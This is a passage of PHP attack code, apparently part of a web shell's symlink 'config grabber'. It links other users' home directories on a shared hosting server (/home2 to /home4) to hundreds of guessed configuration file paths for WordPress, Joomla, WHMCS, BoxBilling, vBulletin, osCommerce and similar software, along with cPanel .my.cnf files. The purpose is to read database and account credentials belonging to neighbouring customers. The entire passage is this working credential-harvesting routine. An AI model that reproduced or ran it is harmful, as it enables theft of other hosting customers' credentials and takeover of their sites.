    @symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home3

    @symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home4

    @symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
